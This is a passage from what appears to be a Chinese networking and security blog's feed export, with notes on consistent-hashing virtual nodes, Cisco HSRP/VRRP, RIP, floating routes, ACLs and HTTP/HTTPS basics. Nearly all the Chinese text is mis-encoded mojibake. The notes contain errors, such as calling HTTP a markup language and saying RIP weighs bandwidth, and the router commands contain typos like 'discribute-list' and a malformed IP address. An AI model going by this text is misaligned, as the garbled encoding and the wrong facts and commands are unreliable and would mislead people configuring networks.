<p><img src="/Untitled%2013.png"></p>
<p><strong>èŠ‚ç‚¹é›ªå´©</strong></p>
<p>æ•°æ®å€¾æ–œå’ŒèŠ‚ç‚¹å®•æœºéƒ½å¯èƒ½ä¼šå¯¼è‡´ç¼“å­˜é›ªå´©ã€‚</p>
<p>æ‹¿å‰é¢æ•°æ®å€¾æ–œçš„ç¤ºä¾‹æ¥è¯´ï¼Œæ•°æ®å€¾æ–œå¯¼è‡´æ‰€æœ‰ç¼“å­˜æ•°æ®éƒ½æ‰“åˆ° node0 ä¸Šé¢ï¼Œæœ‰å¯èƒ½ä¼šå¯¼è‡´ node0 ä¸å ªé‡è´Ÿè¢«å‹å®äº†ï¼Œnode0 å®•æœºï¼Œæ•°æ®åˆéƒ½æ‰“åˆ° node1 ä¸Šé¢æŠŠ node1 ä¹Ÿæ‰“å®äº†ï¼Œnode1 ä¹Ÿè¢«æ‰“è¶´ä¼ é€’ç»™ node2ï¼Œè¿™æ—¶å€™æ•…éšœå°±åƒåƒé›ªå´©æ—¶æ»šé›ªçƒä¸€æ ·è¶Šæ»šè¶Šå¤§ã€‚</p>
<p>è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯èŠ‚ç‚¹ç”±äºå„ç§åŸå› å®•æœºä¸‹çº¿ã€‚æ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºçš„èŠ‚ç‚¹ node2 ä¸‹çº¿å¯¼è‡´åŸæœ¬åœ¨node2 çš„æ•°æ®å‹åˆ° node0 , åœ¨æ•°æ®é‡ç‰¹åˆ«å¤§çš„æƒ…å†µä¸‹ä¹Ÿå¯èƒ½å¯¼è‡´èŠ‚ç‚¹é›ªå´©ï¼Œå…·ä½“è¿‡ç¨‹å°±åƒåˆšæ‰çš„åˆ†æä¸€æ ·ã€‚</p>
<p>æ€»ä¹‹ï¼Œè¿é”ååº”å¯¼è‡´çš„æ•´ä¸ªç¼“å­˜é›†ç¾¤ä¸å¯ç”¨ï¼Œå°±ç§°ä¸ºèŠ‚ç‚¹é›ªå´©ã€‚</p>
<p><img src="/Untitled%2014.png"></p>
<p><strong>è™šæ‹ŸèŠ‚ç‚¹</strong></p>
<p>é‚£è¯¥å¦‚ä½•è§£å†³ä¸Šè¿°ä¸¤ä¸ªæ£˜æ‰‹çš„é—®é¢˜å‘¢ï¼Ÿå¯ä»¥é€šè¿‡ã€Œè™šæ‹ŸèŠ‚ç‚¹ã€çš„æ–¹å¼è§£å†³ã€‚</p>
<p>æ‰€è°“è™šæ‹ŸèŠ‚ç‚¹ï¼Œå°±æ˜¯å¯¹åŸæ¥å•ä¸€çš„ç‰©ç†èŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šè™šæ‹Ÿå‡ºå‡ ä¸ªå®ƒçš„åˆ†èº«èŠ‚ç‚¹ï¼Œè¿™äº›åˆ†èº«èŠ‚ç‚¹ç§°ä¸ºã€Œè™šæ‹ŸèŠ‚ç‚¹ã€ã€‚æ‰“åˆ°åˆ†èº«èŠ‚ç‚¹ä¸Šçš„æ•°æ®å®é™…ä¸Šä¹Ÿæ˜¯æ˜ å°„åˆ°åˆ†èº«å¯¹åº”çš„ç‰©ç†èŠ‚ç‚¹ä¸Šï¼Œè¿™æ ·ä¸€ä¸ªç‰©ç†èŠ‚ç‚¹å¯ä»¥é€šè¿‡è™šæ‹ŸèŠ‚ç‚¹çš„æ–¹å¼å‡åŒ€åˆ†æ•£åœ¨å“ˆå¸Œç¯çš„å„ä¸ªéƒ¨åˆ†ï¼Œè§£å†³äº†æ•°æ®å€¾æ–œé—®é¢˜ã€‚</p>
<p>ç”±äºè™šæ‹ŸèŠ‚ç‚¹åˆ†æ•£åœ¨å“ˆå¸Œç¯å„ä¸ªéƒ¨åˆ†ï¼Œå½“æŸä¸ªèŠ‚ç‚¹å®•æœºä¸‹çº¿ï¼Œä»–æ‰€å­˜å‚¨çš„æ•°æ®ä¼šè¢«å‡åŒ€åˆ†é…ç»™å…¶ä»–å„ä¸ªèŠ‚ç‚¹ï¼Œé¿å…å¯¹å•ä¸€èŠ‚ç‚¹çªå‘å‹åŠ›å¯¼è‡´çš„èŠ‚ç‚¹é›ªå´©é—®é¢˜ã€‚</p>
<p>ä¸‹å›¾å±•ç¤ºäº†è™šæ‹ŸèŠ‚ç‚¹çš„å“ˆå¸Œç¯åˆ†å¸ƒï¼Œå…¶ä¸­å·¦è¾¹æ˜¯æ²¡åšè™šæ‹ŸèŠ‚ç‚¹æƒ…å†µä¸‹çš„èŠ‚ç‚¹åˆ†å¸ƒï¼Œå³è¾¹èƒŒæ™¯è‰²ç»¿è‰²ä¸¤ä¸ªçš„ node0 èŠ‚ç‚¹æ˜¯ node0 èŠ‚ç‚¹çš„è™šæ‹ŸèŠ‚ç‚¹ï¼›èƒŒæ™¯è‰²çº¢è‰²çš„ node1 èŠ‚ç‚¹æ˜¯ node1 çš„è™šæ‹ŸèŠ‚ç‚¹ã€‚</p>
<p><img src="/Untitled%2015.png"></p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>Hash</category>
      </categories>
      <tags>
        <tag>HASHè¡¨</tag>
        <tag>ä¸€è‡´æ€§HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>HRSP-æµ®åŠ¨è·¯ç”±-RIP-ACL-IPsec</title>
    <url>/archives/db738475.html</url>
    <content><![CDATA[<h1 id="é…ç½®HSRP"><a href="#é…ç½®HSRP" class="headerlink" title="é…ç½®HSRP"></a>é…ç½®HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;å†…ç½‘ç«¯å£<br>R1(config-if)#standby 1 ip è™šæ‹Ÿipåœ°å€<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;é…ç½®å å…ˆæƒ<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;helloé—´éš”ä¸ä¿æŒæ—¶é—´ åŒä¸€hsrpç»„çš„æ—¶é—´åº”ä¸€è‡´<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;é…ç½®ç«¯å£è·Ÿè¸ª<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;é…ç½®ç”Ÿæˆæ ‘å®ç°è´Ÿè½½å‡è¡¡vlan 20èµ°å¤‡ä»½è·¯ç”±<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;å†…ç½‘ç«¯å£<br>R2(config-if)#standby 1 ip è™šæ‹Ÿipåœ°å€<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;è®¾ç½®æ´»è·ƒè·¯ç”±å™¨å¾—å å…ˆæƒï¼Œç”±äºä»è¾ƒä½ä¼˜å…ˆçº§åˆ«å¾—è·¯ç”±å™¨ä¸­å–å›è½¬å‘å…¨ï¼Œå›å¤æ´»è·ƒè·¯ç”±å™¨çš„è§’è‰²<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;helloé—´éš”ä¸ä¿æŒæ—¶é—´<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;é…ç½®ç«¯å£è·Ÿè¸ª<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;é…ç½®ç”Ÿæˆæ ‘å®ç°è´Ÿè½½å‡è¡¡vlan 20èµ°å¤‡ä»½è·¯ç”±<br>ä¼˜å…ˆçº§é«˜çš„è·¯ç”±å…¶ä½œä¸ºä¸»è·¯ç”±ï¼Œä¼˜å…ˆçº§ä½çš„è·¯ç”±ä½œä¸ºå¤‡ä»½è·¯ç”±ï¼Œå½“ä¸»è·¯ç”±å‘ç”Ÿæ•…éšœçš„æ—¶å€™ï¼Œå¤‡ä»½è·¯ç”±ç”±ç›‘å¬çŠ¶æ€åˆ‡æ¢åˆ°æ´»è·ƒçŠ¶æ€ã€‚å½“ä¼˜å…ˆçº§ç›¸åŒæ—¶ï¼Œæ¯”è¾ƒç«¯å£ip,ipè¾ƒå¤§çš„ä½œä¸ºæ´»è·ƒè·¯ç”±ï¼Œå¦‚æœä¼˜å…ˆçº§ä½çš„è·¯ç”±<br>å·²ç»æˆä¸ºäº†æ´»è·ƒè·¯ç”±ï¼Œé‚£ä¹ˆä¼˜å…ˆçº§é«˜çš„è·¯ç”±å°†ä½œä¸ºç›‘å¬è·¯ç”±ï¼Œç›´åˆ°æ´»è·ƒè·¯ç”±å‘ç”Ÿæ•…éšœã€‚å€¼æ„ˆå¤§ä¼˜å…ˆçº§è¶Šé«˜</p>
<h2 id="hsrpåè®®ç»„ä¸­ç”±6ç§çŠ¶æ€ï¼š"><a href="#hsrpåè®®ç»„ä¸­ç”±6ç§çŠ¶æ€ï¼š" class="headerlink" title="hsrpåè®®ç»„ä¸­ç”±6ç§çŠ¶æ€ï¼š"></a>hsrpåè®®ç»„ä¸­ç”±6ç§çŠ¶æ€ï¼š</h2><p>åˆå§‹çŠ¶æ€ï¼šè·¯ç”±å™¨åˆšå¯åŠ¨æ—¶ï¼Œæˆ–è€…é…ç½®å‘ç”Ÿæ”¹å˜æ—¶<br>å­¦ä¹ çŠ¶æ€ï¼šè·¯ç”±å…¶ç­‰å¾…æ¥è‡ªæ´»è·ƒè·¯ç”±å™¨çš„æ¶ˆæ¯ï¼Œæ­¤æ—¶è·¯ç”±å™¨è¿˜æ²¡æœ‰æ”¶åˆ°æ¥è‡ªæ´»è·ƒé‡Œå°¤å…¶çš„helloæ¶ˆæ¯ï¼Œä¹Ÿæ²¡æœ‰å­¦ä¹ åˆ°è™šæ‹Ÿè·¯ç”±å™¨çš„ipåœ°å€<br>ç›‘å¬çŠ¶æ€ï¼šè·¯ç”±å…¶å­¦ä¹ äº†è™šæ‹Ÿçš„ipåœ°å€ï¼Œä½†ä»–æ—¢ä¸æ˜¯æ´»è·ƒè·¯ç”±å™¨ä¹Ÿä¸æ˜¯ç›‘å¬è·¯ç”±å™¨ï¼Œæ­¤æ—¶è´Ÿè´£ç›‘å¬æ¥è‡ªæ´»è·ƒè·¯ç”±å™¨ä¸å¤‡ä»½è·¯ç”±å™¨çš„helloåŒ…<br>å‘è¨€çŠ¶æ€ï¼šè·¯ç”±å™¨å‘¨æœŸæ€§å‘é€helloæ¶ˆæ¯ï¼Œå¹¶å‚ä¸æ´»è·ƒè·¯ç”±å™¨æˆ–è€…å¤‡ä»½è·¯ç”±å™¨çš„äº¬é€‰<br>å¤‡ä»½çŠ¶æ€ï¼šå¤„äºè¯¥çŠ¶æ€çš„è·¯ç”±å™¨æ—¶ä¸‹ä¸€ä¸ªæ´»è·ƒè·¯ç”±å™¨çš„å€™é€‰è®¾å¤‡ï¼Œå…¶å‘¨æœŸæ€§å¾—å‘é€helloåŒ…<br>æ´»è·ƒçŠ¶æ€ï¼šè´Ÿè´£è½¬å‘è™šæ‹Ÿè·¯ç”±å™¨å¾—æ•°æ®åŒ…ï¼Œå¹¶å‘¨æœŸæ€§å¾—å‘é€helloæ¶ˆæ¯ã€‚<br>helloé—´éš”ï¼š3s<br>ä¿æŒé—´éš”10s<br>é€šäº§ä¿æŒé—´éš”è¦åœ¨helloé—´éš”å¾—3å€<br>ä½¿ç”¨udpåè®®</p>
<h2 id="vrrp-è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®"><a href="#vrrp-è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®" class="headerlink" title="vrrp è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®"></a>vrrp è™šæ‹Ÿè·¯ç”±å†—ä½™åè®®</h2><p>åªæœ‰åˆå§‹çŠ¶æ€ã€æ´»è·ƒçŠ¶æ€ã€å¤‡ä»½çŠ¶æ€ä¸‰ç§çŠ¶æ€<br>å…è®¸vrrpç»„å¾—è®¾å¤‡é—´å»ºç«‹è®¤è¯æœºåˆ¶</p>
<h1 id="rip-è·ç¦»çŸ¢é‡ç®—æ³•ï¼Œæ ¹æ®è·³æ•°æ¥é€‰æ‹©è·¯ç”±"><a href="#rip-è·ç¦»çŸ¢é‡ç®—æ³•ï¼Œæ ¹æ®è·³æ•°æ¥é€‰æ‹©è·¯ç”±" class="headerlink" title="rip-è·ç¦»çŸ¢é‡ç®—æ³•ï¼Œæ ¹æ®è·³æ•°æ¥é€‰æ‹©è·¯ç”±"></a>rip-è·ç¦»çŸ¢é‡ç®—æ³•ï¼Œæ ¹æ®è·³æ•°æ¥é€‰æ‹©è·¯ç”±</h1><p>å±äºå†…éƒ¨ç½‘å…³åè®®igp-æœ‰ä¸€ç³»åˆ—åè®®æ—  è¿˜æœ‰ä¸€ç§æ—¶å¤–éƒ¨ç½‘å…³åè®®egp-åªæœ‰ä¸€ç§åè®®<br>å†…éƒ¨ç½‘å…³åè®®æ˜¯å¾€å¾€æ˜¯å·¥ä½œåœ¨ä¸€ä¸ªç»„ç»‡å®ä½“é‡Œé¢çš„çš„è·¯ç”±å™¨ä¹‹é—´äº¤æ¢è·¯ç”±ä¿¡æ¯çš„åè®®ï¼Œç»„ç»‡å®ä½“æ˜¯æŒ‡åƒå­¦æ ¡ã€åŒ»é™¢ä¹‹ç±»çš„å®ä½“<br>æœ€å¤§è·¯ç”±è·³æ•°ä¸º15è·³ï¼Œå¤§äºè¯¥å€¼çš„è·¯ç”±è¢«è®¤ä¸ºä¸å¯è¾¾</p>
<p>å½“æ›´æ–°å‘¨æœŸåˆ°è¾¾æ—¶ï¼Œå…¶å‘ç›¸é‚»çš„è·¯ç”±å™¨å‘é€å­¦ä¹ åˆ°çš„è·¯ç”±ã€‚</p>
<p>é€šè¿‡æ›´è¡Œ-update ä¸è¯·æ±‚-requestsä¸¤ç§åˆ†ç»„æ¥ä¼ è¾“ä¿¡æ¯ï¼Œæ›´æ–°å‘¨æœŸä¸º30sï¼Œå¦‚æœä¸è¿›è¡ŒæŒ‡å®šé»˜è®¤é€šè¿‡å¹¿æ’­çš„å½¢å¼æ›´æ–°ä¿¡æ¯ã€‚æ›´æ–°ä¿¡æ¯åŒ…æ‹¬è·¯ç”±è¡¨ä¸è·³æ•°ä¸¤ä¸ªéƒ¨åˆ†ã€‚å…¶å¹¶ä¸æ˜¯ç»å¯¹æ ¹æ®è·³æ•°æ¥é€‰æ‹©è·¯ç”±çš„ï¼ŒåŒæ—¶ä¹Ÿä¼šå‚è€ƒç½‘ç»œçš„å¸¦å®½ã€‚å› ä¸ºripåè®®é€šè¿‡ç›¸é‚»è·¯ç”±å™¨æ¥æ›´æ–°è·¯ç”±è¡¨æ‰€ä»¥å¤šç½‘ç»œå…¨å±€çš„çŠ¶å†µä¸æ¸…é™¤ï¼Œä»è€Œå¯¼è‡´äº†ä¸€ä¸ªæ…¢æ”¶æ•›ä¸ä¸ä¸€è‡´çš„é—®é¢˜ã€‚å½“ä¸‰ä¸ªç«æ›´å¤šè·¯ç”±å™¨æ„æˆç¯è·¯æ˜¯è·¯ç”±ç¯è·¯çš„é—®é¢˜ä»ä¼šå‘ç”Ÿï¼Œè¿™æ˜¯éœ€è¦ç”¨åˆ°è§¦å‘æ›´æ–°æ³•</p>
<p>RIPçš„æ°´å¹³åˆ†å‰²</p>
<p>æ—¢è·¯ç”±å™¨ä¸å‘è·¯å¾„åˆ°æ¥çš„æ–¹å‘å›ä¼ æ­¤è·¯å¾„ã€‚é€šè¿‡å°†è¿™äº›è·¯ç”±çš„è·³æ•°è®¾ç½®ä¸º16æ¥å®ç°è¯¥åŠŸèƒ½ï¼Œèƒ½åŠæ—¶çš„è§£å†³è·¯ç”±ç¯è·¯çš„é—®é¢˜</p>
<p>RIPçš„ä¿æŒå®šæ—¶å™¨æ³•</p>
<p>ä¿æŒå®šæ—¶å™¨å¯ä»¥é˜²æ­¢è·¯ç”±å™¨åœ¨è·¯å¾„ä»è·¯ç”±å™¨ä»è·¯ç”±è¡¨ä¸­åˆ é™¤ä¸€å®šæ—¶é—´å†…ï¼ˆé€šå¸¸ä¸º180ç§’ï¼‰æ¥å—æ–°çš„è·¯ç”±ä¿¡æ¯ã€‚ç›®çš„æ˜¯ä¸ºäº†ä¿è¯æ¯ä¸ªè·¯ç”±å™¨éƒ½æ”¶åˆ°è·¯ç”±ä¸å¯è¾¾çš„ä¿¡æ¯ï¼Œä»è€Œæœ‰æ•ˆå¾—é¿å…äº†è·¯ç”±ç¯è·¯å¾—äº§ç”Ÿã€‚</p>
<p>RIPçš„è§¦å‘æ›´æ–°æ³•</p>
<p>å½“æŸä¸ªè·¯å¾„çš„è·³æ•°æ”¹å˜äº†è·¯ç”±å™¨ç«‹å³å‘ç”Ÿæ›´æ–°ä¿¡æ¯ï¼Œä¸ç®¡è·¯ç”±å™¨æ˜¯å¦åˆ°è¾¾å¸¸è§„ä¿¡æ¯æ›´æ–°æ—¶é—´éƒ½å‘å‡ºæ›´æ–°ä¿¡æ¯ã€‚èƒ½å¤Ÿæœ‰æ•ˆå¾—åŠ å¿«è·¯ç”±çš„æ”¶æ•›æ—¶é—´</p>
<p>æ”¶æ•›æœºåˆ¶</p>
<p><img src="/archives/db738475/QQ20210329085323.png"></p>
<p>å½“ä¸»æœºä¸å…¶ç›´è¿è·¯ç”±å™¨çš„é“¾è·¯å‘ç”Ÿä¸­æ–­æ—¶ï¼Œå…¶ç«‹åˆ»å‘äºå…¶ç›¸é‚»çš„ä¸¤ä¸ªè·¯ç”±å™¨å‘é€è·¯ç”±æ›´æ–°ä¿¡æ¯ï¼Œå¦‚æœæ­¤æ—¶å‘é€åˆ°å³ä¸‹è·¯ç”±å™¨çš„ä¿¡æ¯å‘ç”Ÿå µå¡å»¶è¿Ÿï¼Œåˆ™å³ä¸Šæ–¹çš„è·¯ç”±å™¨å…ˆå¾—åˆ°æ›´æ–°ä¿¡æ¯ï¼Œå°†æ—§çš„åˆ°è¾¾ä¸»æœºçš„è·¯ç”±ä¿¡æ¯ä¸¢å¼ƒï¼Œå³ä¸‹æ–¹è·¯ç”±å™¨å› ä¸ºæ²¡æœ‰æ”¶åˆ°æ¥è‡ªå·¦ä¸Šè·¯ç”±å™¨çš„æ›´æ–°ä¿¡æ¯ï¼Œç»§ç»­å‘å³ä¸Šè·¯ç”±å™¨å‘é€æ—§çš„è·¯ç”±ä¿¡æ¯ï¼Œå³ä¸Šæ–¹è·¯ç”±å™¨æ”¶åˆ°ååˆæ·»åŠ ä¸€æ¡åˆ°è¾¾ä¸»æœºçš„è·¯ç”±ã€‚å¦‚æ­¤å¾ªç¯å½¢æˆäº†è·¯ç”±ç¯è·¯ã€‚<br>ä½¿ç”¨udpåè®®çš„520ç«¯å£</p>
<p>RIPå¸§æ ¼å¼</p>
<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIPå¸§æ ¼å¼</a></p>
<p>(config)#router rip<br>(config)#acc 1 deny any<br>(config-router)# network æ¥å£ç½‘æ®µ<br>(config-router)# network æ¥å£ç½‘æ®µ<br>(config-router)# passive-interface f0&#x2F;1 &#x2F;&#x2F;é…ç½®è¢«åŠ¨æ¥å£ï¼Œåªæ”¶ä¸å‘<br>(config-router)# discribute-list 1 in f0&#x2F;1 &#x2F;&#x2F;é…ç½®è·¯ç”±è¿‡æ»¤<br>(config-router)# distance 50 &#x2F;&#x2F;é…ç½®ç®¡ç†è·ç¦»å€¼ï¼Œè¯¥å€¼è¶Šå°è·¯ç”±ä¿¡æ¯è¶Šå¯é <br>(config-router)# neigbor 192l.168.1.24 &#x2F;&#x2F;é…ç½®é‚»å±…è·¯ç”±ï¼Œä»¥å•æ’­çš„å½¢å¼å‘é€è·¯ç”±ä¿¡æ¯</p>
<h1 id="é…ç½®æµ®åŠ¨è·¯ç”±"><a href="#é…ç½®æµ®åŠ¨è·¯ç”±" class="headerlink" title="é…ç½®æµ®åŠ¨è·¯ç”±"></a>é…ç½®æµ®åŠ¨è·¯ç”±</h1><p>ip route ç½‘æ®µ æ©ç  ä¸‹ä¸€è·³åœ°å€|ç«¯å£å· 70<br>ip route ç½‘æ®µ æ©ç  ä¸‹ä¸€è·³åœ°å€|ç«¯å£å· 100 &#x2F;&#x2F;æœ€åä¸€ä¸ªå‚æ•°ä½ç®¡ç†è·ç¦»ï¼Œå…¶å€¼è¶Šå¤§è¡¨ç¤ºä¼˜å…ˆçº§è¶Šä½</p>
<h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>é…ç½®aclé¦–å…ˆè¦é…ç½®å†…å¤–ç½‘ç«¯å£ï¼Œé…ç½®è¿‡æ»¤è§„åˆ™ï¼Œå°†è§„åˆ™åº”ç”¨åˆ°ç«¯å£ã€‚æœ€åæœ‰ä¸€æ¡é»˜è®¤æ‹’ç»æ‰€æœ‰ã€‚deny any</p>
<p>ACLåŒ…æ‹¬æ ‡å‡†acl ä¸æ‰©å±•acl</p>
<p>æ ‡å‡†aclæ˜¯æœºä¸æºipåœ°å€è¿›è¡Œè¿‡æ»¤çš„ å·¥ä½œåœ¨ä¸‰æˆ è¡¨å·1-99</p>
<p>æ‰©å±•aclå¯ä»¥é€šè¿‡ç«¯å£å·ã€åè®®ç­‰è¿›è¡ŒåŒ¹é…è¿‡æ»¤ å›½ç¥šåœ¨ä¸‰å±‚ä¸å››å±‚ è¡¨å· 100-199</p>
<p>ä¸€ä¸ªæ¥å£çš„ä¸€ä¸ªæ–¹å‘åªèƒ½æœ‰ä¸€å¼ aclè¡¨ï¼Œæ•°æ®åŒ…ä¸€æ—¦è¢«æŸä¸ªruleåŒ¹é…ï¼Œå°±ä¸å†å‘ä¸‹è¿›è¡ŒåŒ¹é…ã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>HRSP</tag>
        <tag>RIP</tag>
        <tag>ACL</tag>
        <tag>IPSec</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP-HTTPSåè®®</title>
    <url>/archives/ac8f02b1.html</url>
    <content><![CDATA[<h1 id="HTTP-HTTPSåè®®"><a href="#HTTP-HTTPSåè®®" class="headerlink" title="HTTP&#x2F;HTTPSåè®®"></a>HTTP&#x2F;HTTPSåè®®</h1><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTPæ¦‚è¿°"><a href="#HTTPæ¦‚è¿°" class="headerlink" title="HTTPæ¦‚è¿°"></a>HTTPæ¦‚è¿°</h2><p>http-è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œå±äºä¸ƒå±‚åº”ç”¨å±‚åè®®ï¼Œé»˜è®¤ç«¯å£å·80ï¼ŒåŸºäºtcpçš„åè®®ã€‚</p>
<p>httpåè®®æ˜¯æ— è¿æ¥ï¼Œæ— çŠ¶æ€çš„ä¸€ç§åè®®</p>
<p>æ— è¿æ¥ï¼šæ¯æ¬¡è¿æ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚</p>
<p>æ— çŠ¶æ€ï¼šå¯¹äº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›</p>
<p>HTTPä½¿ç”¨ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆUniform Resource Identifiers, URIï¼‰æ¥ä¼ è¾“æ•°æ®å’Œå»ºç«‹è¿æ¥ã€‚URLæ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„URIï¼ŒåŒ…å«äº†ç”¨äºæŸ¥æ‰¾æŸä¸ªèµ„æºçš„è¶³å¤Ÿçš„ä¿¡æ¯</p>
<p>URI:ä¸€ç§æŠ½è±¡çš„æ ‡è¯†èµ„æºçš„æ–¹æ³•ï¼Œå¹¶ä¸èƒ½å®šä½èµ„æº</p>
<p>URL:å³å¯æ ‡è¯†èµ„æºï¼Œä¹Ÿå¯å®šä½èµ„æº</p>
<p>URNï¼šä»…æ˜¯èµ„æºçš„ä¸€ç§å‘½åæ ‡å‡†</p>
<p>URLåŒ…æ‹¬ä»¥ä¸‹éƒ¨åˆ†ï¼š</p>
<p>åè®®éƒ¨åˆ†:&#x2F;&#x2F;ç”¨æˆ·å:å¯†ç @åŸŸåéƒ¨åˆ†&#x2F;è™šæ‹Ÿç›®å½•éƒ¨åˆ†&#x2F;æ–‡ä»¶åéƒ¨åˆ†?å‚æ•°éƒ¨åˆ†#é”šéƒ¨åˆ†</p>
<h2 id="HTTPç‰ˆæœ¬åŒºåˆ«"><a href="#HTTPç‰ˆæœ¬åŒºåˆ«" class="headerlink" title="HTTPç‰ˆæœ¬åŒºåˆ«"></a>HTTPç‰ˆæœ¬åŒºåˆ«</h2><p>http1.1å¯¹æ¯”http1.0ï¼šä½¿ç”¨äº†ç®¡é“åŒ–æŠ€æœ¯ï¼ŒåŠ å…¥äº†é•¿è¿æ¥åŠŸèƒ½ã€‚æ­¤æ—¶ä¸€ä¸ªhttpè¿æ¥å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªhttpè¯·æ±‚ï¼Œä½†æ˜¯å¯¹äºå›åŒ…æ¥è¯´ï¼Œæ— æ³•åˆ†åˆ«å‡ºæ˜¯å±äºå“ªä¸ªè¯·æ±‚çš„ï¼Œè¿˜æ˜¯å¿…é¡»è¦å»æŒ‰ç…§è¯·æ±‚çš„é¡ºåºè¿”å›ï¼Œè¿™å°±å¯¼è‡´äº†ä¸€ä¸ªå…¼åš<code>çº¿å¤´é˜»å¡</code>  çš„é—®é¢˜ï¼ŒåŒæ—¶http1.1ä¹Ÿä¸æ”¯æŒæœåŠ¡ç«¯æ¨é€åŠŸèƒ½</p>
<p>http2.0ï¼šå¢åŠ äº†æœåŠ¡ç«¯æ¨é€ï¼Œé€šè¿‡å¸§ã€æµç­‰æ‰‹æ³•è§£å†³äº†çº¿å¤´é˜»å¡çš„é—®é¢˜ï¼Œå†ä¸€ä¸ªè¿æ¥ä¸­ï¼Œå¯ä»¥å‘é€å¤šä¸ªè¯·æ±‚ï¼Œä¸€ä¸ªè¯·æ±‚æ—¶ä¸€ä¸ªæµï¼Œä¸€ä¸ªæµè¢«åˆ†æˆå¾ˆå¤šå¸§ã€‚ä½¿ç”¨äº†æ ‡å¿—ä½æ¥åŒºåˆ†ä¸åŒçš„è¯·æ±‚</p>
<h2 id="HTTPå¤´"><a href="#HTTPå¤´" class="headerlink" title="HTTPå¤´"></a>HTTPå¤´</h2><h3 id="HTTPè¯·æ±‚å¤´"><a href="#HTTPè¯·æ±‚å¤´" class="headerlink" title="HTTPè¯·æ±‚å¤´"></a>HTTPè¯·æ±‚å¤´</h3><p>**è¯·æ±‚è¡Œ ï¼š**è¯·æ±‚æ–¹æ³• è¯·æ±‚èµ„æº åè®®ç±»å‹ ç‰ˆæœ¬å·</p>
<p>**è¯·æ±‚å¤´ï¼š**åŒ…æ‹¬è¯·æ±‚ä¸»æœºã€ç”¨æˆ·ä»£ç†ã€refererã€cookieã€acceptã€accept-encodingã€accept-languageã€cache-controlã€connectionã€if-none-matchç­‰lastmodified</p>
<p>**ç©ºè¡Œï¼š**åˆ†å‰²è¯·æ±‚å¤´ä¸è¯·æ±‚ä½“</p>
<p><strong>è¯·æ±‚ä½“</strong>ï¼šè¯·æ±‚å‚æ•°</p>
<p>è¯·æ±‚æ–¹æ³•åŒ…æ‹¬getã€postã€putã€deleteã€connectionç­‰</p>
<h3 id="HTTPå“åº”å¤´"><a href="#HTTPå“åº”å¤´" class="headerlink" title="HTTPå“åº”å¤´"></a>HTTPå“åº”å¤´</h3><p>**çŠ¶æ€è¡Œï¼š**åè®®ç±»å‹ ç‰ˆæœ¬å· å“åº”ç  å“åº”æ¶ˆæ¯</p>
<p>**å“åº”å¤´ï¼š**æ—¥æœŸã€set-cookieã€access-control-allow-origainã€connectionã€content-encodingã€content-Typeã€etagã€varyã€ x-xss-protectionã€x-frame-options</p>
<p>ç©ºè¡Œï¼š</p>
<p><strong>å“åº”ä½“ï¼š</strong></p>
<p><strong>GETä¸PSOTçš„åŒºåˆ«</strong></p>
<ol>
<li>getæäº¤çš„æ•°æ®ä¼šæ”¾åœ¨urlä¸­ï¼Œpostæäº¤çš„æ•°æ®å­˜æ”¾åœ¨è¯·æ±‚ä½“ä¸­</li>
<li>GETæ–¹æ³•æäº¤çš„æ•°æ®æœ‰å¤§å°é™åˆ¶ï¼Œæµè§ˆå™¨å¯¹urlé•¿åº¦æœ‰é™åˆ¶4k,postæ–¹æ³•æ— </li>
<li>GETæ–¹å¼æäº¤çš„æ•°æ®ç›´æ¥å­˜æ”¾åœ¨urlä¸­ï¼Œä¸å®‰å…¨ã€‚</li>
</ol>
<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>ä»¥ä¸‹ç¬”è®°å‚è€ƒ</p>
<p><a href="https://www.jianshu.com/p/a3a25c6627ee">Httpsè¯¦è§£+wiresharkæŠ“åŒ…æ¼”ç¤º</a></p>
<p>æˆ‘ä»¬çŸ¥é“httpåè®®æ˜¯æ— çŠ¶æ€ã€æ— è¿æ¥çš„ä¸€ç§æ˜æ–‡ä¼ è¾“çš„åè®®ã€‚é‚£ä¹ˆåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æˆ‘ä»¬çš„æ•°æ®å°±å¯èƒ½ä¼šè¢«ä¸æ³•åˆ†å­æ‰€åŠ«æŒã€ç¯¡æ”¹ç­‰ã€‚</p>
